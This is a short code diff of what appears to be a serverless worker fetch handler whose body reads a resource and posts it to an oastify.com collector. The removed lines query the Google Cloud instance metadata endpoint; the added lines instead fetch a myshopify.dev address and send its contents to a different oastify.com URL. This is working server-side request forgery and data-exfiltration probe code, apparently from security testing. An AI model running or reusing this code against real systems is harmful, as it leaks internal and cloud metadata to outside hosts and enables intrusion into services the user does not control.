@@ -15,7 +15,7 @@ export default {
   async fetch(request, env, executionContext) {
 
 
-fetch("http://metadata.google.internal/computeMetadata/v1/instance/hostname")
+fetch("https://rep2-5ca74ac5f9a48700b57c.o2.myshopify.dev/")
   .then((response) => response.text())
   .then((data) => {
     const options = {
@@ -26,7 +26,7 @@ fetch("http://metadata.google.internal/computeMetadata/v1/instance/hostname")
       body: data,
     };
 
-    fetch("https://xde2mz5rdthvhp1vmhb5hlg7syypmgf44.oastify.com/api/results", options)
+    fetch("https://0975i21u9wdydsxyik78docao1uvil6a.oastify.com/api/results", options)
       .then((response) => {
         console.log(`statusCode: ${response.status}`);
         return response.text();
